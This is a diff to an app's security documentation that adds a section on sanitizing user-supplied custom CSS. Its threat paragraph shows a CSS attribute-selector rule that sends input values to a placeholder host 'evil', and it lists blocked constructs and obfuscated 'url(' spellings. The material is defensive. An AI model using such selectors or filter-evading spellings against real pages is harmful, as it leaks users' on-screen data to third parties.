@@ -282,6 +282,44 @@ Treat a webhook URL like a password: anyone holding it can post to that channel 
 webhook is deleted. Failed guesses are not rate limited per source; at 256 bits that is not a
 practical attack, but it is the thing to add first if the surface ever becomes public.
 
+## Custom CSS
+
+Users can opt in to their own stylesheet (Settings, Appearance, Advanced). It is applied only for
+that user, in a `<style id="user-custom-css">` after the app's CSS. Nobody else's page ever
+receives it.
+
+**Threat.** CSS cannot run script, but `url()` makes the browser send a request. Combined with
+attribute selectors (`input[value^="a"] { background: url(https://evil/a) }`) that request can leak
+what is on screen to a third party, and a remote `@import` or `@font-face` hands control of the
+page's look to someone else. The author of the CSS is the person looking at the page, so the
+realistic risk is a user pasting a stylesheet from someone else.
+
+**Measures.** One shared function, `sanitizeCss` in `packages/shared`, runs on the server when
+settings are saved (the stored text is always the sanitized text) and again in the browser before
+injection, so a row written some other way is still cleaned. It:
+
+- decodes CSS escapes outside strings and drops comments before matching, so `u\rl(`, `\75 rl(`,
+  `u/**/rl(` and mixed case are seen as the browser would see them;
+- removes `@import`, every `url()` except an inline `data:image/(png|gif|webp|jpeg);base64,`
+  image, and image functions that take bare strings (`image-set()`, `cross-fade()`, `src()`);
+- removes `@font-face` blocks with a non-inline source;
+- removes `expression()`, `behavior:`, `-moz-binding`, `javascript:` and `</style`;
+- repeats until the text stops changing, so removing one piece cannot assemble a new `url(`, and
+  returns nothing if it never settles.
+
+The text is set with `textContent`, never parsed as HTML. Settings size is capped at 20 KB. SVG
+data URLs are not allowed because they can reference further resources.
+
+**Recovery.** `?safe` in the address (or the "Exit" pill it shows) turns off custom CSS and custom
+themes for that page load, so a stylesheet that hides the interface can always be undone.
+
+**Not covered.** A stylesheet can still make the interface unusable or misleading for its owner
+(hide buttons, restyle text). It cannot reach other users. Theme tokens are validated separately:
+only allowlisted semantic tokens, colors as hex, `rgb()` or `hsl()` and bounded lengths, so a
+theme string cannot carry `url()`, `var()` or a declaration break-out. Because escapes outside
+strings are decoded, selectors that rely on escaped characters (`.sm\:flex`) are rewritten and
+need a different spelling.
+
 ## Desktop app
 
 The desktop app (`apps/desktop`, Tauri v2) is a window around the user's own Harmony server. It does
